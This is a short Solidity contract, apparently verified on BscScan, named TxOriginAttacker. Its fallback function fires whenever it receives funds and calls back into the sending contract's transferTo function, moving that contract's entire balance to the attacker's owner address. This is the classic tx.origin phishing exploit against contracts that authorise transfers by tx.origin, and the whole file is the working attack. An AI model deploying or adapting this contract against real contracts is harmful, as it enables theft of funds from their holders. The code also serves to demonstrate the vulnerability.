/**
 *Submitted for verification at BscScan.com on 2023-05-03
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.4.18;

interface TxOriginVictim {
    function transferTo(address to, uint amount);
}

contract TxOriginAttacker {
    address owner;

    function TxOriginAttacker() public {
        owner = msg.sender;
    }

    function getOwner() public returns (address) {
        return owner;
    }

    function() payable public {
        TxOriginVictim(msg.sender).transferTo(owner, msg.sender.balance);
    }
}